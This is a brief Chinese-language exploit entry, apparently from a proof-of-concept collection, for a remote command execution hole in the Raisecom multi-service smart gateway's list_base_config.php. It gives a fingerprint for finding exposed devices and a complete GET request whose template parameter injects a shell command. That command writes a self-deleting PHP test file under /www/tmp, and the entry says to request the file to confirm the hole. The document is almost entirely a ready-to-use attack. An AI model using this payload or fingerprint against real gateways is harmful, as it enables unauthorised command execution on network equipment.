# 瑞斯康达-多业务智能网关list_base_config.php远程命令执行漏洞

- **系统**：瑞斯康达-多业务智能网关list_base_config.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/images/raisecom/back.gif"`
- **请求**：`GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1`

**请求体 / payload**
```
/tmp/test.php
请求后验证漏洞
```
- **预期**：200　|　—